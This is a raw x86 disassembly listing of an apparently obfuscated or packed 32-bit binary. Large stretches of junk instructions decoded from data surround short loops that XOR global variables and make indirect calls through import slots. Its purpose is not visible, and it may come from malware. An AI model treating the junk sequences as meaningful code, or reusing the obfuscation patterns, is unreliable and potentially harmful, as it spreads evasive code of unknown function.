  40b83f:	adc    eax,0xacdcf74c
  40b844:	pop    es
  40b845:	and    al,0x66
  40b847:	test   BYTE PTR [edx+0x583960b4],dh
  40b84d:	pop    eax
  40b84e:	mov    dl,BYTE PTR [edx+0x51]
  40b851:	jg     0x40b817
  40b853:	loop   0x40b814
  40b855:	(bad)  
  40b856:	sbb    al,0x2a
  40b858:	dec    ebp
  40b85a:	out    0xa3,eax
  40b85c:	shr    DWORD PTR ds:0x1d4bdf80,1
  40b862:	or     al,0xc0
  40b864:	jno    0x40b8e0
  40b866:	pop    ebx
  40b867:	push   ecx
  40b868:	mov    bl,0xd7
  40b86a:	push   cs
  40b86b:	scas   al,BYTE PTR es:[edi]
  40b86c:	lahf   
  40b86d:	test   al,0xe3
  40b86f:	cmp    ah,BYTE PTR [esi+eiz*2+0x5d0c754f]
  40b876:	pop    ds
  40b877:	jbe    0x40b827
  40b879:	xor    ah,BYTE PTR [ebp-0x250e48c5]
  40b87f:	lds    esi,FWORD PTR [edi+0x3cb06922]
  40b885:	and    al,0x88
  40b887:	and    dl,BYTE PTR [ebx+0x5]
  40b88a:	dec    ebp
  40b88b:	or     ah,bh
  40b88d:	adc    ecx,0xffffffe7
  40b890:	ds inc ebp
  40b892:	push   ecx
  40b893:	adc    ah,al
  40b895:	pushf  
  40b896:	lods   al,BYTE PTR ds:[esi]
  40b897:	xor    BYTE PTR [edx-0x6fe4443f],al
  40b89d:	ins    DWORD PTR es:[edi],dx
  40b89e:	jmp    0x40b82a
  40b8a0:	push   ebx
  40b8a1:	xchg   edx,eax
  40b8a2:	xchg   DWORD PTR ds:0x51205dc9,esi
  40b8a8:	mov    eax,ds:0xfb40ae5b
  40b8ad:	push   ecx
  40b8ae:	xchg   edx,eax
  40b8af:	xor    al,0xe3
  40b8b1:	and    eax,0xf4dd8a17
  40b8b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8b7:	xchg   edx,eax
  40b8b8:	js     0x40b859
  40b8ba:	lods   eax,DWORD PTR ds:[esi]
  40b8bb:	adc    DWORD PTR [ebx+0x74],esp
  40b8be:	rol    BYTE PTR [ebp-0x1f],cl
  40b8c1:	shr    DWORD PTR [ebx+ebx*1+0x4b3f135e],0x84
  40b8c9:	jge    0x40b86e
  40b8cb:	mov    ebx,0x284f7854
  40b8d0:	xchg   ebx,eax
  40b8d1:	neg    BYTE PTR [edx+ecx*8]
  40b8d4:	xchg   ebp,eax
  40b8d5:	pop    edx
  40b8d6:	add    edx,DWORD PTR [ecx-0x65]
  40b8d9:	jnp    0x40b86d
  40b8db:	stos   BYTE PTR es:[edi],al
  40b8dc:	jle    0x40b958
  40b8de:	push   esp
  40b8df:	fwait
  40b8e0:	xchg   ecx,eax
  40b8e1:	test   eax,0x7fcb20b4
  40b8e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8e7:	call   0x92b9:0x7d77b52b
  40b8ee:	in     eax,dx
  40b8ef:	cmp    al,0x2b
  40b8f1:	and    eax,DWORD PTR [ecx+0x6b]
  40b8f4:	fwait
  40b8f5:	lods   eax,DWORD PTR ds:[esi]
  40b8f6:	cmp    al,0xab
  40b8f8:	push   ecx
  40b8f9:	mov    DWORD PTR es:[ebp-0x14],esi
  40b8fd:	sbb    ecx,DWORD PTR ds:0x430546
  40b903:	mov    DWORD PTR [ebp-0x8],esi
  40b906:	xor    ecx,DWORD PTR ds:0x430496
  40b90c:	mov    ecx,DWORD PTR [ebp-0x18]
  40b90f:	neg    DWORD PTR ds:0x43049e
  40b915:	xor    ecx,eax
  40b917:	sbb    DWORD PTR ds:0x4304a6,0x1292
  40b921:	xor    edi,edi
  40b923:	add    ecx,ebx
  40b925:	mov    DWORD PTR [ebp-0x20],ecx
  40b928:	mov    DWORD PTR ds:0x42ee28,edi
  40b92e:	mov    eax,DWORD PTR [ebp-0x20]
  40b931:	je     0x40c70d
  40b937:	xor    DWORD PTR ds:0x42ee2c,edi
  40b93d:	mov    eax,DWORD PTR [ebp-0x4]
  40b940:	xor    eax,0x7510856
  40b945:	xor    DWORD PTR ds:0x42ee20,0x27f1
  40b94f:	jmp    0x40baad
  40b954:	mov    edx,ds
  40b956:	inc    edi
  40b957:	aam    0x59
  40b959:	push   ebp
  40b95a:	mov    ebp,0x1f44e87a
  40b95f:	adc    BYTE PTR [edi+0x67],0xb1
  40b963:	bound  edi,QWORD PTR [esi]
  40b965:	clc    
  40b966:	jle    0x40b9e6
  40b968:	aas    
  40b969:	jg     0x40b9e9
  40b96b:	jle    0x40b90a
  40b96d:	repnz shl DWORD PTR [esi+0x36],1
  40b971:	pop    ecx
  40b972:	dec    esp
  40b973:	add    BYTE PTR [ebp+0x73bb74d1],ch
  40b979:	test   eax,0xc3fc0d7a
  40b97e:	inc    ecx
  40b97f:	adc    esi,DWORD PTR [eax+0x1c]
  40b982:	imul   esp
  40b984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b985:	outs   dx,BYTE PTR ds:[esi]
  40b986:	mov    ah,0x34
  40b988:	or     dl,al
  40b98a:	(bad)  
  40b98b:	ret    0xc5c
  40b98e:	cli    
  40b98f:	xchg   esi,eax
  40b990:	(bad)  
  40b991:	cmp    eax,0xbcec8edf
  40b996:	sub    ebx,ebp
  40b998:	pop    esi
  40b999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b99a:	fwait
  40b99b:	scas   al,BYTE PTR es:[edi]
  40b99c:	push   ebp
  40b99d:	jne    0x40b958
  40b99f:	(bad)  
  40b9a1:	daa    
  40b9a2:	jo     0x40ba1a
  40b9a4:	adc    BYTE PTR [ebx],dh
  40b9a6:	cs aaa 
  40b9a8:	jecxz  0x40b985
  40b9aa:	mov    edi,0x14be9d9d
  40b9af:	and    bh,bh
  40b9b1:	add    BYTE PTR [edx+0x2d],cl
  40b9b4:	pop    eax
  40b9b5:	inc    eax
  40b9b6:	test   BYTE PTR [ebx+edx*4],al
  40b9b9:	add    BYTE PTR [edx-0x1eec4388],al
  40b9bf:	fcomp  QWORD PTR [esi]
  40b9c1:	aam    0x63
  40b9c3:	inc    eax
  40b9c4:	xchg   DWORD PTR [ebx-0x1f9cdd49],eax
  40b9ca:	pop    ecx
  40b9cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9cc:	aam    0xf4
  40b9ce:	inc    esi
  40b9cf:	sub    BYTE PTR [esi+0x71],0x7
  40b9d3:	inc    edx
  40b9d4:	inc    esp
  40b9d5:	inc    edx
  40b9d6:	pop    ebx
  40b9d7:	mov    ebx,DWORD PTR [ecx+0x38]
  40b9da:	mov    eax,ds:0x16a201e8
  40b9df:	pop    edx
  40b9e0:	pop    eax
  40b9e1:	clc    
  40b9e2:	mov    esi,gs
  40b9e4:	adc    edx,ecx
  40b9e6:	mov    ch,0x6a
  40b9e8:	ficomp DWORD PTR [esp+ebx*1+0x1f]
  40b9ec:	add    eax,0xb5d161e9
  40b9f1:	and    al,0x4d
  40b9f3:	inc    esp
  40b9f4:	(bad)  
  40b9f5:	xchg   ebx,eax
  40b9f6:	cli    
  40b9f7:	mov    eax,ds:0xfa927d14
  40b9fc:	cld    
  40b9fd:	dec    ebp
  40b9fe:	sub    eax,0x5e7fa64b
  40ba03:	push   edi
  40ba04:	jle    0x40b99f
  40ba06:	pusha  
  40ba07:	sub    BYTE PTR [esi+0x7212404f],0x85
  40ba0e:	or     BYTE PTR [edi-0x15],dl
  40ba11:	pop    ebx
  40ba12:	jno    0x40b9d0
  40ba14:	ret    
  40ba15:	imul   edx,DWORD PTR [ebp+0x5b],0x16b980da
  40ba1c:	adc    ebp,DWORD PTR [eax-0xe]
  40ba1f:	(bad)  
  40ba20:	cmp    ah,BYTE PTR [ecx+edi*4]
  40ba23:	inc    ebx
  40ba24:	dec    ebx
  40ba25:	rol    bh,0xaf
  40ba28:	sbb    DWORD PTR [edx],0xafe5bf9f
  40ba2e:	pop    ss
  40ba2f:	mov    DWORD PTR [edi-0x75],edi
  40ba32:	stos   DWORD PTR es:[edi],eax
  40ba33:	es aam 0xcb
  40ba36:	cwde   
  40ba37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba38:	(bad)  
  40ba39:	gs dec ecx
  40ba3b:	push   edi
  40ba3c:	pop    ecx
  40ba3d:	ss loope 0x40baa3
  40ba40:	add    BYTE PTR [edi-0x20],ah
  40ba43:	push   esp
  40ba44:	cld    
  40ba45:	push   ebp
  40ba46:	sub    al,0x5b
  40ba48:	jge    0x40ba40
  40ba4a:	dec    edx
  40ba4b:	jbe    0x40ba56
  40ba4d:	loop   0x40bacd
  40ba4f:	dec    ebp
  40ba50:	mov    ah,0x5a
  40ba52:	shr    eax,1
  40ba54:	ins    DWORD PTR es:[edi],dx
  40ba55:	mov    al,0x51
  40ba57:	sub    bh,BYTE PTR [edx]
  40ba59:	imul   esp,edi,0x38924fe8
  40ba5f:	dec    ebp
  40ba60:	fiadd  DWORD PTR [ecx-0x5a5a3ac2]
  40ba66:	ret    0x6993
  40ba69:	xlat   BYTE PTR ds:[ebx]
  40ba6a:	push   eax
  40ba6b:	cmp    ch,BYTE PTR [edx]
  40ba6d:	fldcw  WORD PTR [esp+edi*1-0x72ca3248]
  40ba74:	jbe    0x40ba82
  40ba76:	inc    esi
  40ba77:	mov    edi,0xe8ccf95b
  40ba7c:	mov    cl,0x77
  40ba7e:	aas    
  40ba7f:	mov    ebp,0xdcb2c1b6
  40ba84:	scas   al,BYTE PTR es:[edi]
  40ba85:	or     eax,0xd9e8afa3
  40ba8a:	outs   dx,DWORD PTR ds:[esi]
  40ba8b:	mov    dh,0x95
  40ba8d:	and    dh,BYTE PTR [ebp+0x63f8d1b]
  40ba93:	and    bh,BYTE PTR [edi-0x47]
  40ba96:	and    ebx,DWORD PTR [ebx-0x52]
  40ba99:	inc    ecx
  40ba9a:	pop    es
  40ba9b:	pop    esi
  40ba9c:	jbe    0x40bb12
  40ba9e:	mov    ds:0x9c008d0a,eax
  40baa3:	sbb    al,0x5d
  40baa5:	iret   
  40baa6:	int3   
  40baa7:	inc    ebp
  40baa8:	pusha  
  40baa9:	pop    esp
  40baaa:	stos   BYTE PTR es:[edi],al
  40baab:	test   edi,eax
  40baad:	add    eax,ebx
  40baaf:	mov    DWORD PTR ds:0x42ee20,0x3d16
  40bab9:	cmp    edi,eax
  40babb:	mov    DWORD PTR ds:0x430496,0x64f1
  40bac5:	jne    0x40c296
  40bacb:	or     DWORD PTR ds:0x42ee28,0x42ee14
  40bad5:	push   DWORD PTR [ebp+0x8]
  40bad8:	call   0x40a1ba
  40badd:	mov    DWORD PTR [ebp-0x20],eax
  40bae0:	mov    eax,DWORD PTR [ebp-0x4]
  40bae3:	mov    ecx,DWORD PTR [ebp-0x20]
  40bae6:	and    DWORD PTR ds:0x42ee1c,0x0
  40baf0:	mov    esi,DWORD PTR ds:0x42ee1c
  40baf6:	inc    esi
  40baf7:	mov    DWORD PTR ds:0x42ee1c,esi
  40bafd:	cmp    DWORD PTR ds:0x42ee1c,0x22
  40bb04:	jne    0x40bb1b
  40bb0a:	push   DWORD PTR [ebp-0x1c]
  40bb0d:	push   DWORD PTR [ebp-0x24]
  40bb10:	push   0x6795
  40bb15:	call   DWORD PTR ds:0x42ebd4
  40bb1b:	cmp    DWORD PTR ds:0x42ee1c,0x1d
  40bb22:	jb     0x40baf0
  40bb28:	mov    esi,DWORD PTR ds:0x430556
  40bb2e:	xor    DWORD PTR ds:0x4304b6,esi
  40bb34:	mov    esi,0x7510856
  40bb39:	add    DWORD PTR ds:0x4304b2,0x43049a
  40bb43:	xor    eax,esi
  40bb45:	jmp    0x40bca3
  40bb4a:	jns    0x40bb9f
  40bb4c:	mov    ah,0x6a
  40bb4e:	pop    esp
  40bb4f:	ins    DWORD PTR es:[edi],dx
  40bb50:	jns    0x40bbb7
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	iret   
  40bb54:	loopne 0x40bbad
  40bb56:	cmc    
  40bb57:	jmp    0x7e7e:0xf9ff3839
  40bb5e:	aas    
  40bb5f:	jg     0x40bbdf
  40bb61:	jle    0x40baf5
  40bb63:	call   0x1132ba4e
  40bb68:	mov    dl,0x34
  40bb6a:	mov    ?,WORD PTR [ebp-0x1f0b9e6e]
  40bb70:	and    BYTE PTR [edx],dl
  40bb72:	push   es
  40bb73:	mov    ss,ecx
  40bb75:	(bad)  
  40bb76:	mov    esi,0x29e9e5d3
  40bb7b:	jo     0x40bb6a
  40bb7d:	pop    esi
  40bb7e:	cli    
  40bb7f:	push   ss
  40bb80:	fisttp QWORD PTR [edx-0x566054e8]
  40bb86:	and    al,0x72
  40bb88:	mov    ebx,0x3975fa8f
  40bb8d:	mov    WORD PTR [ebx+0x47],ds
  40bb90:	sbb    BYTE PTR [eax+ecx*1+0x2c7fa538],0xc7
  40bb98:	stc    
  40bb99:	in     al,0xa5
  40bb9b:	inc    esp
  40bb9c:	aas    
  40bb9d:	inc    edi
  40bb9e:	bnd jmp 0x5952346c
  40bba4:	stos   DWORD PTR es:[edi],eax
  40bba5:	sbb    ecx,eax
  40bba7:	loope  0x40bb8f
  40bba9:	and    al,bh
  40bbab:	pop    eax
  40bbac:	in     al,dx
  40bbad:	add    ecx,DWORD PTR [ebp+ebx*1+0x44]
  40bbb1:	daa    
  40bbb2:	inc    esp
  40bbb3:	and    BYTE PTR [edx],bh
  40bbb5:	je     0x40bb81
  40bbb7:	inc    eax
  40bbb8:	fild   DWORD PTR [eax+0x5c6a07a6]
  40bbbe:	fcos   
  40bbc0:	sar    DWORD PTR [edx+0x68fafb33],1
  40bbc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbc7:	loope  0x40bb4b
  40bbc9:	sub    ebp,DWORD PTR [ecx+0x1f]
  40bbcc:	adc    BYTE PTR [ebp+esi*1+0x29],ah
  40bbd0:	push   cs
  40bbd1:	lods   eax,DWORD PTR ds:[esi]
  40bbd2:	into   
  40bbd3:	addr16 ret 0xaa65
  40bbd7:	(bad)  
  40bbd8:	clc    
  40bbd9:	push   ebp
  40bbda:	nop
  40bbdb:	push   esp
  40bbdc:	jecxz  0x40bbd6
  40bbde:	jmp    0xb481a247
  40bbe3:	out    dx,eax
  40bbe4:	jno    0x40bb84
  40bbe6:	jae    0x40bc42
  40bbe8:	retf   
  40bbe9:	push   edx
  40bbea:	cmp    cl,BYTE PTR [edi]
  40bbec:	ds (bad) 
  40bbee:	cmc    
  40bbef:	pop    edx
  40bbf0:	pop    DWORD PTR [eax+esi*2-0x71]
  40bbf4:	add    edi,DWORD PTR [ecx]
  40bbf6:	adc    edi,DWORD PTR [eax-0x4b]
  40bbf9:	bound  ebp,QWORD PTR [edx]
  40bbfb:	daa    
  40bbfc:	and    DWORD PTR ds:0xad26887b,0x989b4954
  40bc06:	add    eax,DWORD PTR [esi]
  40bc08:	scas   al,BYTE PTR es:[edi]
  40bc09:	or     BYTE PTR [ebp+0x25dbc299],0x46
  40bc10:	cmp    al,0x9b
  40bc12:	outs   dx,BYTE PTR ds:[esi]
  40bc13:	lea    edx,[esi-0x4a04fe14]
  40bc19:	mov    bh,ch
  40bc1b:	(bad)  
  40bc1c:	jg     0x40bbab
  40bc1e:	cmp    al,0x2
  40bc20:	dec    ebx
  40bc21:	les    ebp,FWORD PTR [eax+0x1d4737c0]
  40bc27:	loope  0x40bc6a
  40bc29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc2a:	jecxz  0x40bc00
  40bc2c:	jmp    0x40bcab
  40bc2e:	push   ss
  40bc2f:	arpl   WORD PTR [eax-0x47ad3712],cx
  40bc35:	mov    eax,ds:0x6d6e0424
  40bc3a:	fucomip st,st(4)
  40bc3c:	jnp    0x40bc27
  40bc3e:	sub    esp,DWORD PTR [edi]
  40bc40:	mov    ds:0x6ed7d69a,al
  40bc45:	sbb    BYTE PTR [edx+ebp*4],0x2c
  40bc49:	pop    ds
  40bc4a:	and    DWORD PTR [esi+esi*4-0x66b9c813],0x1590bb78
  40bc55:	repz daa 
  40bc57:	and    al,0xee
  40bc59:	jne    0x40bc1a
  40bc5b:	jp     0x40bc50
  40bc5d:	adc    eax,0xf67f0a79
  40bc62:	dec    ebp
  40bc63:	or     BYTE PTR [edi+0xc],bh
  40bc66:	sahf   
  40bc67:	cmp    edi,DWORD PTR [ebx+0x5a]
  40bc6a:	xchg   edi,eax
  40bc6b:	lds    eax,FWORD PTR [edx+eiz*2]
  40bc6e:	and    DWORD PTR [ecx+0x5d248f3],0x8812783
  40bc78:	inc    dx
  40bc7a:	pop    ss
  40bc7b:	mov    dh,0x42
  40bc7d:	push   edx
  40bc7e:	xchg   edi,eax
  40bc7f:	pop    ss
  40bc80:	clc    
  40bc81:	in     eax,dx
  40bc82:	mov    WORD PTR [ecx-0x1f],cs
  40bc85:	dec    esp
  40bc86:	and    al,0xe5
  40bc88:	add    edx,DWORD PTR [eax+ecx*1+0x5aeaadaa]
  40bc8f:	cmp    bl,BYTE PTR [eax+edi*1]
  40bc92:	jge    0x40bc30
  40bc94:	jns    0x40bc1b
  40bc96:	jp     0x40bca7
  40bc98:	sbb    al,0xa5
  40bc9a:	sbb    al,0xcb
  40bc9c:	xlat   BYTE PTR ds:[ebx]
  40bc9d:	test   BYTE PTR [edi-0x613f76df],dh
  40bca3:	add    eax,ebx
  40bca5:	cmp    ecx,eax
  40bca7:	mov    DWORD PTR ds:0x430552,0x373b
  40bcb1:	je     0x40c6f1
  40bcb7:	sbb    DWORD PTR ds:0x43054e,0x42ee30
  40bcc1:	push   DWORD PTR [ebp-0x20]
  40bcc4:	and    DWORD PTR ds:0x4304be,0x430546
  40bcce:	push   DWORD PTR [ebp+0x8]
  40bcd1:	call   0x40a7ab
  40bcd6:	and    DWORD PTR ds:0x4304c2,0x0
  40bce0:	jmp    0x40bcf2
  40bce5:	mov    ecx,DWORD PTR ds:0x4304c2
  40bceb:	inc    ecx
  40bcec:	mov    DWORD PTR ds:0x4304c2,ecx
  40bcf2:	cmp    DWORD PTR ds:0x4304c2,0x1e
  40bcf9:	jae    0x40bd40
  40bcff:	cmp    DWORD PTR ds:0x4304c2,0xd
  40bd06:	jne    0x40bd1f
  40bd0c:	push   DWORD PTR [ebp-0xc]
  40bd0f:	push   0x4304a2
  40bd14:	push   0x2a1f
  40bd19:	call   DWORD PTR ds:0x42ea2c
  40bd1f:	cmp    DWORD PTR ds:0x4304c2,0xc
  40bd26:	jne    0x40bd3b
  40bd2c:	xor    ecx,ecx
  40bd2e:	add    ecx,DWORD PTR ds:0x4304c2
  40bd34:	inc    ecx
  40bd35:	mov    DWORD PTR ds:0x4304c2,ecx
  40bd3b:	jmp    0x40bce5
  40bd40:	mov    DWORD PTR [ebp-0x14],eax
  40bd43:	xor    DWORD PTR ds:0x42e772,0x3e11
  40bd4d:	mov    eax,DWORD PTR [ebp-0x4]
  40bd50:	add    ecx,DWORD PTR ds:0x430496
  40bd56:	mov    ecx,DWORD PTR [ebp-0x14]
  40bd59:	xor    eax,esi
  40bd5b:	or     DWORD PTR ds:0x43055a,0x430552
  40bd65:	add    eax,ebx
  40bd67:	cmp    ecx,eax
  40bd69:	mov    DWORD PTR ds:0x42ee10,0x41d
  40bd73:	je     0x40c6f1
  40bd79:	add    eax,ecx
  40bd7b:	mov    eax,DWORD PTR [ebp-0x14]
  40bd7e:	mov    DWORD PTR ds:0x4304b2,0x19
  40bd88:	cmp    DWORD PTR ds:0x4304b2,0x0
  40bd8f:	je     0x40bdbf
  40bd95:	cmp    DWORD PTR ds:0x4304b2,0x1b
  40bd9c:	jne    0x40bdad
  40bda2:	push   0x2712
  40bda7:	call   DWORD PTR ds:0x42ea30
  40bdad:	mov    ecx,DWORD PTR ds:0x4304b2
  40bdb3:	dec    ecx
  40bdb4:	mov    DWORD PTR ds:0x4304b2,ecx
  40bdba:	jmp    0x40bd88
  40bdbf:	mov    eax,DWORD PTR [eax+0x18]
  40bdc2:	sub    ecx,DWORD PTR ds:0x43055a
  40bdc8:	mov    DWORD PTR [ebp-0x20],eax
  40bdcb:	jmp    0x40bf29
  40bdd0:	fld    QWORD PTR [ebx-0x66]
  40bdd3:	xor    bl,BYTE PTR [ebx+ecx*8+0x503d5d5d]
  40bdda:	cmp    al,0x3b
  40bddc:	and    al,dh
  40bdde:	jo     0x40be17
  40bde0:	mov    al,0xfa
  40bde2:	jle    0x40be62
  40bde4:	aas    
  40bde5:	jg     0x40be65
  40bde7:	jle    0x40be64
  40bde9:	jl     0x40bdf3
  40bdeb:	xchg   ebx,eax
  40bdec:	inc    esp
  40bded:	mov    ebp,0xfaf0c7b4
  40bdf2:	pop    edi
  40bdf3:	pusha  
  40bdf4:	xchg   ecx,eax
  40bdf5:	fsub   QWORD PTR [esi]
  40bdf7:	or     bl,bh
  40bdf9:	push   cs
  40bdfa:	mov    esp,0x638cb238
  40bdff:	sbb    DWORD PTR [eax-0x4f],ecx
  40be02:	adc    BYTE PTR [edx-0x41],0xd9
  40be06:	cld    
  40be07:	push   ebx
  40be08:	cmp    BYTE PTR [ebx+ecx*4-0x6d],bl
  40be0c:	pop    ss
  40be0d:	loopne 0x40bdff
  40be0f:	(bad)  
  40be10:	xor    BYTE PTR [ebp-0x51],cl
  40be13:	cmp    DWORD PTR ds:0x665d95f6,ebx
  40be19:	pop    eax
  40be1a:	or     DWORD PTR [ecx+ebx*1+0xabd463a],ebx
  40be21:	xor    ecx,DWORD PTR [esi]
  40be23:	xor    ecx,DWORD PTR [esi+0x3f]
  40be26:	pushf  
  40be27:	sbb    eax,eax
  40be29:	dec    edi
  40be2a:	std    
  40be2b:	inc    ebp
  40be2c:	lds    ecx,FWORD PTR [edx+0x1fa76e26]
  40be32:	sbb    DWORD PTR [esi-0x18],edi
  40be35:	fwait
  40be36:	stos   BYTE PTR es:[edi],al
  40be37:	rcl    BYTE PTR [ebx],cl
  40be39:	adc    eax,0xfdf7debe
  40be3e:	jno    0x40bea5
  40be40:	ja     0x40beb7
  40be42:	push   0xf060a8d7
  40be47:	and    eax,0xcd84273a
  40be4c:	push   cs
  40be4d:	add    al,0xd2
  40be4f:	js     0x40be9e
  40be51:	jle    0x40beba
  40be53:	mov    ebx,0x18d43368
  40be58:	jmp    0x40be20
  40be5a:	pushf  
  40be5b:	inc    esp
  40be5c:	dec    esp
  40be5d:	outs   dx,DWORD PTR ds:[esi]
  40be5e:	sar    BYTE PTR [ebp-0x4b],0x19
  40be62:	mov    DWORD PTR [esi],eax
  40be64:	fs push edi
  40be66:	mov    WORD PTR [edi],?
  40be68:	push   ebx
  40be69:	add    ch,BYTE PTR [ebx+edi*1+0x1c]
  40be6d:	mov    ebx,DWORD PTR [esi]
  40be6f:	js     0x40bedc
  40be71:	pop    ebp
  40be72:	or     esi,eax
  40be74:	enter  0xacf9,0x67
  40be78:	(bad)  
  40be79:	jns    0x40be39
  40be7b:	mov    ecx,0xc362683c
  40be80:	mov    ds:0x307afab,eax
  40be85:	fsubrp st(6),st
  40be87:	mov    ch,0x72
  40be89:	xchg   DWORD PTR [eax+0x41],edx
  40be8c:	cdq    
  40be8d:	nop
  40be8e:	xchg   edi,eax
  40be8f:	outs   dx,DWORD PTR ds:[esi]
  40be90:	cmc    
  40be91:	(bad)  
  40be92:	jb     0x40bedc
  40be94:	retf   
  40be95:	or     ah,BYTE PTR [esi]
  40be97:	repz mov dl,0xc5
  40be9a:	(bad)  
  40be9b:	into   
  40be9c:	ror    DWORD PTR [edi-0x6e7b52e2],1
  40bea2:	xchg   esp,eax
  40bea3:	adc    BYTE PTR [eax-0x3e],dl
  40bea6:	dec    edi
  40bea7:	outs   dx,BYTE PTR ds:[esi]
  40bea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bea9:	or     ecx,DWORD PTR [ebx-0xc]
  40beac:	int    0x24
  40beae:	(bad)  
  40beaf:	icebp  
  40beb0:	dec    eax
  40beb1:	ins    BYTE PTR es:[edi],dx
  40beb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beb3:	sub    eax,0x28edb8b4
  40beb8:	in     al,0xb6
  40beba:	rcl    DWORD PTR [ecx+eiz*4],cl
  40bebd:	jmp    0xa50fa935
  40bec2:	jmp    0x40be67
  40bec4:	mov    bl,BYTE PTR [ebp+eiz*4-0x2]
  40bec8:	xor    BYTE PTR [edx],ah
  40beca:	sub    eax,0x748b45c8
  40becf:	xchg   esp,eax
  40bed0:	push   edx
  40bed1:	out    0x60,eax
  40bed3:	jo     0x40bea5
  40bed5:	sbb    dh,BYTE PTR [ebx+0x483046a2]
  40bedb:	or     eax,0x24fae49b
  40bee0:	fsub   QWORD PTR [esi-0xddf8adf]
  40bee6:	movaps xmm0,xmm6
  40bee9:	repnz pushf 
  40beeb:	push   esp
  40beec:	mov    edx,0x1d4a59cc
  40bef1:	fadd   QWORD PTR [ebx+0x6e]
  40bef4:	push   esp
  40bef5:	cdq    
  40bef6:	test   BYTE PTR [ecx-0x63ad25ac],dh
  40befc:	lock cmp al,0x81
  40beff:	mov    ch,BYTE PTR [esp+ebx*8+0x3dbe7973]
  40bf06:	ja     0x40be99
  40bf08:	mov    ds:0x30d8fab5,al
  40bf0d:	cdq    
  40bf0e:	sub    dl,ch
  40bf10:	mov    eax,ds:0x34bb5173
  40bf15:	mov    WORD PTR [eax-0x4c7e585d],gs
  40bf1b:	jmp    0x40bf5f
  40bf1d:	or     BYTE PTR [eax-0x3],0x1b
  40bf21:	lods   al,BYTE PTR ds:[esi]
  40bf22:	sbb    edi,DWORD PTR [ecx+0x48]
  40bf25:	cs push ebx
  40bf27:	cli    
  40bf28:	mov    ecx,0x8bec458b
  40bf2d:	dec    ebp
  40bf2e:	or     BYTE PTR [ecx+0x4304a61d],al
  40bf34:	add    BYTE PTR [esi+ecx*1+0x59e90000],dl
  40bf3b:	add    DWORD PTR [eax],eax
  40bf3d:	add    ah,bl
  40bf3f:	(bad)  
  40bf40:	lods   eax,DWORD PTR ds:[esi]
  40bf41:	dec    edi
  40bf42:	ins    DWORD PTR es:[edi],dx
  40bf43:	jge    0x40bf41
  40bf45:	popf   
  40bf46:	mov    dh,0x46
  40bf48:	(bad)  
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	add    DWORD PTR [ebx+edi*2+0x26],edi
  40bf4e:	jno    0x40bf4c
  40bf50:	jle    0x40bfd0
  40bf52:	aas    
  40bf53:	jg     0x40bfd3
  40bf55:	jle    0x40befd
  40bf57:	retf   0xa9e0
  40bf5a:	out    0xf5,eax
  40bf5c:	xor    eax,0x15893bac
  40bf61:	add    edx,0xffffffd7
  40bf64:	test   eax,0xe357caf
  40bf69:	lahf   
  40bf6a:	pop    edx
  40bf6b:	or     cl,ah
  40bf6d:	ja     0x40bf72
  40bf6f:	xchg   BYTE PTR [edx+0x2],bh
  40bf72:	int3   
  40bf73:	xchg   esp,eax
  40bf74:	jnp    0x40bf7b
  40bf76:	gs pusha 
  40bf78:	or     DWORD PTR [esi+0x1fed8302],ebp
  40bf7e:	push   ss
  40bf7f:	jle    0x40bf86
  40bf81:	repnz adc ebp,DWORD PTR [ecx]
  40bf84:	call   0x48e0:0xd2d783a3
  40bf8b:	push   edi
  40bf8c:	out    dx,eax
  40bf8d:	dec    al
  40bf8f:	mov    DWORD PTR ds:0xc30b2f5c,ecx
  40bf95:	dec    eax
  40bf96:	xchg   ebx,eax
  40bf97:	pop    edx
  40bf98:	pop    ds
  40bf99:	fsubrp st(7),st
  40bf9b:	pop    esi
  40bf9c:	xchg   esi,eax
  40bf9d:	mov    BYTE PTR ds:[eax+0x7f],cl
  40bfa1:	mov    bl,0xf7
  40bfa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfa4:	sbb    ah,BYTE PTR [ecx]
  40bfa6:	fs inc ebx
  40bfa8:	or     al,0x3b
  40bfaa:	xor    al,0x22
  40bfac:	jae    0x40bfda
  40bfae:	lea    ebx,[edi-0x5f6b6c07]
  40bfb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfb5:	out    0xfb,eax
  40bfb7:	les    ebx,FWORD PTR [esi+eax*2-0x5b]
  40bfbb:	imul   esi,DWORD PTR [eax+ecx*2+0x7bc6af08],0x2f0ebbe
  40bfc6:	xlat   BYTE PTR ds:[ebx]
  40bfc7:	hlt    
  40bfc8:	outs   dx,BYTE PTR ds:[esi]
  40bfc9:	mov    al,ds:0x4effbfcc
  40bfce:	adc    ah,cl
  40bfd0:	pop    esp
  40bfd1:	loope  0x40bfcd
  40bfd3:	xor    al,0xc1
  40bfd5:	ins    DWORD PTR es:[edi],dx
  40bfd6:	shr    ah,0x42
  40bfd9:	and    DWORD PTR [esi+ebx*4+0x204ed6f1],esi
  40bfe0:	setae  BYTE PTR ds:0xdc29356d
  40bfe7:	into   
  40bfe8:	push   ds
  40bfe9:	pop    esp
  40bfea:	out    dx,al
  40bfeb:	inc    ebx
  40bfec:	mov    eax,0xd2242cd1
  40bff1:	into   
  40bff2:	stos   DWORD PTR es:[edi],eax
  40bff3:	sub    ah,cl
  40bff5:	jg     0x40c016
  40bff7:	(bad)  
  40bff8:	jb     0x40c061
  40bffa:	stos   BYTE PTR es:[edi],al
  40bffb:	sub    eax,0x7a7a9b9
  40c000:	jmp    0x40c06a
  40c002:	inc    ebp
  40c003:	xor    esi,DWORD PTR [esp+edi*1-0x5a]
  40c007:	pop    eax
  40c008:	mov    bl,0xb7
  40c00a:	pop    es
  40c00b:	aas    
  40c00c:	and    eax,0x230c25d1
  40c011:	(bad)  
  40c012:	leave  
  40c013:	push   es
  40c014:	mov    ds:0x2dac1807,eax
  40c019:	ds (bad) 
  40c01c:	push   eax
